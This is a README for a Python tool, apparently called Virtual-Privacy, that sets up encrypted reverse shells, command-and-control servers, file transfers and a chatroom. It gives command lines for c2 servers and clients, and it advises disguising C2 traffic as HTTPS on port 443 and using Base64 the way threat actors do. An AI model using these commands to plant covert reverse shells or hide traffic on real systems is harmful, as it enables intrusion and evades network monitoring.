# Virtual-Privacy

Virtual-Privacy (VP) is a Pythonic Swiss army knife for conducting covert communications over insecure networks. Featuring four levels of encryption, 24 host iterations (command and control, file transfers, and a chatroom), a number of options for generating credentials, and additonally the ability to encrypt a file, directory, or an entire path recursively with a single command. VP employs elements of SSH, PGP, and PKI to maintain confidentiality, integrity, and authenticity for network communications.

It should be noted, that although the Chatroom operations are styled after AOL chat rooms circa 1999, they can be layered with encryption to be a suitable communication medium for individuals working in contemporary spycraft.

## In this repository:

You will find a comprehensive manual that will teach you how to use all of the easy features to conduct covert communications that the program offers!

## Index:

1) [Installation](#installation)
2) [VP Encryption Options](#vp_encryption_options)
3) [Generate Credentials]
4) [Generating Credentials](#generating-credentials)
5) [Host Operations](#host_operations)
6) [Encryption & Decryption](#encryption_&_decryption_options)


## Installation

VP uses one non-standard Python library, `pycryptodome`. VP also requires OpenSSL.

**To install Virtual-Privacy:**

1) Download Virtual-Privacy:

```bash
git clone https://github.com/0x00wolf/virtual-privacy
```

2) Navigate to the parent directory:

```bash
cd ./virtual-privacy
```

3) Create a virtual environment, activate it, and install pycryptodome:

```bash
python -m venv venv
source ./venv/bin/activate
pip install pycryptodome
```

4) Generate some credentials, throw some reverse shells, and have fun!


## VP Encryption Options

1) [Base64](#base64)
2) [SSL](#ssl)
3) [VPP](#vpp)
4) [SSL & VPP](#vpp_&_ssl)

### Base64

By default all communications are encoded with Base64. Although this 
doesn't provide confidentially, integrity, or authenticity, it provides a 
base layer of obfuscation to communications, which is often used by threat 
actors while acquiring a foothold on a new network.

**Example: Creating a Base64 Encoded Reverse Shell**

```bash
# Server side (long form)
python vp.py --server c2 --host 0.0.0.0 --port 1337

# Client side (short form)
python vp.py -c c2 -ip 192.168.2.16 -p 1337
```

### SSL

VP's second level of encryption allows users to encrypt communications with 
TLSv1.3. SSL provides end-to-end encryption, alternatively, it also enables 
users to mask their communications as regular traffic, particularly if they 
utilize a common port like 443, or 853 for the server connection, which 
would make traffic look like HTTPs, DoT, or DoH.

See [Generate Credentials](#generate-credentials) for VP's built in options 
for producing the required credentials. Fast-gen, in particular, will 
immediately spit out everything you need.

**Example: Creating an SSL Encrypted Reverse Shell**

```bash
# server side (long form)
python vp.py --server c2 --private-key ./path/privkey.pem --certificate .
/path/cert.crt --only-ssl --host 0.0.0.0 --port 443

# Client side (short form)
python vp.py -c c2 -crt ./path/cert.crt -ip www.bobcats.com -p 1337
```


### VPP

The Virtual Privacy Protocol provides authenticity, confidentiality, and 
integrity. It utilizes a hybrid encryption model, and additionally 
signature verification for each transmission. Specifically, VPP uses 
ChaCha20-Poly1305 AEAD wrapped in RSA. 

VPP requires that both parties have exchanged RSA public keys in advance. 
The server administrator must register the remote user's public key in the 
runtime SQL database in advance of the client connecting (see [Database 
Operations](#database_operations)). The client has to provide the server's 
RSA public key as a runtime argument. For detailed information on 
generating an RSA keypair, see [Generate Credentials](#generate-credentials).


**Example VPP Encrypted c2 Host Operation:**

```bash
# Generate the required credentials (both parties)
python vp.py -pki rsa

# Server side (short form)
python vp.py -s c2 -pr ./key.pem -ip 0.0.0.0 -p 1337

# Client side (long form)
python vp.py --client c2 --host 192.168.2.15 --port 1337 --private-key ./key.
pem 
```

### 

## **Modes of operation**

5) Decryption
6) Database


## **Generate Credentials

Credential operations can be accessed via the generate-pki runtime argument:

```bash
# long form
python vp.py --generate-pki [OPERATION]

# short form
python vp.py -pki [OPERATION]
```

VP provides four options for users to generate credentials. The first option 
uses pycryptodome to provide an option for generating RSA keys, including 
optional private key encryption using best practices. The remaining three 
options are wrappers for OpenSSL, which allow VP users to credentials for 
SSL on the fly, or establish more in depth PKI, including a root 
Certificate Authority. 

#### Credential Operations:

1) [rsa](#rsa)
2) [self-sign](#self-sign)
3) [fast-gen](#fast-gen)
4) [root-ca](#root-ca)


#### **rsa**

This function allows the user to generate a new RSA keypair, with optional 
password encryption. 

Note: Both optional arguments must be supplied for the program to accept 
them.

Optional Args:
`--private-key` | `-pr`: Supply the export path for the private key in advance
`--public-key` | `-pu`: Suppy the export path for the public key in advance.

```bash
# Long form:
python vp.py --generate-pki rsa

# Short form
python vp.py -pki rsa

# Optional, supply export paths in advance: 
python vp.py -pki rsa --private-key ./export/path/privkey.pem --public-key  
```


#### **self-sign**

This operation takes a preexisting RSA private key and uses it to produce a 
self-signed x509 certificate for establishing SSL. 

Args:
- `--private-key` | `-pr`: Path to an RSA private key

Optional args:
- `--certificate` | `-crt`: Optional export path for the signed x509 
certificate. 

Default export path: `-crt ./cert.crt`

```bash
# Long form:
python vp.py --generate-pki self-sign --private-key ./path/privkey.pem  

# Short form:
python vp.py -pki ss -pr ./path/privkey.pem

# With an optional export path for the certificate
python vp.py -pki ss -pr /path/privkey.pem --certificate ./my_certificate.crt
```


#### **fast-gen**

This operation instantly spits out the necessary credentials for 
establishing a SSL encrypted connection, a new RSA private key and signed 
x509 certificate.

Optional args:
- `--private-key` | `-pr`: The export path for the RSA private key.
- `--certificate` | `-crt`: The export path for the signed certificate.

Defaults:
- `-pr ./key.pem -crt ./cert.crt`

```bash
# Long form:
python vp.py --generate-pki fast-generate

# Short form:
python vp.py -pki fg

```


#### **root-ca**

The `root-ca` operation allows users to interactively generate public 
key infrastructure. The output from this operation includes creating a root 
Certificate Authority, a server RSA keypair, and a CA signed certificate 
for the server.

Takes no args.

```bash
# Long form:
python vp.py --generate-pki root-ca

# Short form:
python vp.py -pki ca
```

## **Client & Server Operations**

Both client and server operating modes feature 12 variations on 3 host 
archetypes: Command & Control (c2), File Transfers (FTP), & Chatroom (chat).

Each operating mode has 4 variations, relative to the different encryption 
levels VP offers. The user simply needs to supply the required credentials 
for the desired operating mode, and VP will select the correct host at 
runtime. For more information on VP's encryption options, see: 
[VP Encryption Options](#vp-encryption-options). 

1) [c2](#c2)
2) [ftp](#ftp)
3) [chat](#chat)

#### **c2**

VP's Command & Control mode sends a Pythonic reverse shell from the client 
to the server. The client runs the shell in a subprocess and 
uses Pipes to funnel the stdin, stdout & stderr over the network connection,
allowing VP to encrypt the data streams in the process.

**Level 1 - No encryption (Base64)**
```bash
# Level 1 - No encryption```
